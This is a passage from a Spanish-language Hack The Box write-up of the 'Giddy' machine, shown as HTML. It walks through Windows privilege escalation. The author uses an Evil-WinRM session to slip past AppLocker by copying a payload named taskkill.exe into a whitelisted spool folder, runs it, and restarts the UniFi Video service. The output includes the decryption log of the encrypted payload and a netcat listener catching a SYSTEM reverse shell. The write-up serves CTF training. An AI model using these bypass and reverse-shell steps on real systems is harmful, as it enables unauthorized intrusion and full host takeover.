+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
+Program <span class="s1">'taskkill.exe'</span> failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
++ .<span class="se">\t</span>askkill.exe
++ ~~~~~~~~~~~~~~.
+At line:1 char:1
++ .<span class="se">\t</span>askkill.exe
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+</code></pre></div></div>
+
+<ul>
+  <li>Aquí nos dicen rutas para que no nos pase eso <a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; copy taskkill.exe C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\t</span>askkill.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Si lo ejecutamos nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor&gt; .<span class="se">\t</span>askkill.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> IV: 1150b91085ef56a08ef912c3eb577bf7
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Size of encrypted_payload:  9600
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hash of encrypted_payload: 0b07402cefb4af5c5479a73d1ce4c9263622edf5ec70b53c750207e111d46d967727a660aeb7de5b29c8327585d76eb7c03182940081d2fff0d0d664319600a7
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Number of keys: 1
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Final key_list: <span class="o">[</span>giddy]
+<span class="o">==================================================</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key: giddy
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Computed Full Key @ 2710 iterations: 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c8a0e4c69b5ea1fba75d8bce580a3a7a51df239e28be0c36675dd065b1d4dd921
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AES Password 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Decoded Payload with Padding: 2e95bce3869bea6029ee864c4d9765424a36413a268f452c532259ee2faecc6708d839228cc51165614c0e8f8a1c0396b5695db2c1eba525c3d121cf9b4de819
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Message Length: 7168
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Message Length w/ Padding: 7168
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Test Hash : 1392fb2eafe3dfd6a8e0ff9159df555b5ec2f19ff617c78811ecf66834abdd9062b8dfc7d3696311ecaf53834c9bad4efbb02107a2fb0fd9378547686374fe32
+Search Hash: 1392fb2eafe3dfd6a8e0ff9159df555b5ec2f19ff617c78811ecf66834abdd9062b8dfc7d3696311ecaf53834c9bad4efbb02107a2fb0fd9378547686374fe32
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hashes Match
+Len full_payload: 7168
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Combinations:  <span class="o">[[</span>giddy]]
+</code></pre></div></div>
+
+<ul>
+  <li>Con esto podemos ver que si funciona pero queremos estar como el administrador si recordamos necesitamos parar el servicio y arrancarlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; Stop-Service <span class="nt">-Name</span> UniFiVideoService <span class="nt">-Force</span>
+Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
+Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
+Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
+Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
+Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
+</code></pre></div></div>
+
+<ul>
+  <li>Y ahora ya estamos como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.216] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.96.140] 49774
+Microsoft Windows <span class="o">[</span>Version 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;whoami
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/medium/2024/04/26/giddy.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
